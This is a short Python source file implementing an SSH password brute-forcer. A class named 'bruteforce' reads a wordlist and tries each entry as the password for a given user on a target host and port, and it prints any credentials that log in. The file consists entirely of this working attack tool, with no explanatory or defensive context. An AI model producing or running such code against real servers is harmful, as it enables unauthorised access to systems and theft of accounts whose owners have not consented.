import socket, threading
from rich import print
from ssh2.session import Session

class bruteforce:
    def __init__(self, ip: str, port: int, username: str, wordlist, timeout: float) -> None:
        self.ip = ip
        self.port = port
        self.username = username
        self.wordlist = wordlist
        self.timeout = timeout
        self.start_attack()

    def start_attack(self):
        print(f'[green][+] Starting attack on {self.ip}:{self.port}')
        try:
            with open(self.wordlist, 'r') as words:
                for word in words.readlines():
                    print(f'[yellow][!] Trying {word}', end='\r')
                    self.connect(self.ip, self.username, word, self.port, self.timeout)
        except FileNotFoundError:
            print(f'[red][-] {self.wordlist} not found')

    @staticmethod
    def connect(host: str, user: str, passwd: str, port: int, timeout: float=1.0):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            s = Session()
            s.handshake(sock)
            s.userauth_password(user, passwd) # try to login
            print(f'[green][+] {host}:{port} - {user}:{passwd}\n')
            return True
        except Exception as e:
            if str(e) == 'timed out':
                print(f"[red][!] Timed out")
            else:
                pass
        finally:
            sock.close()
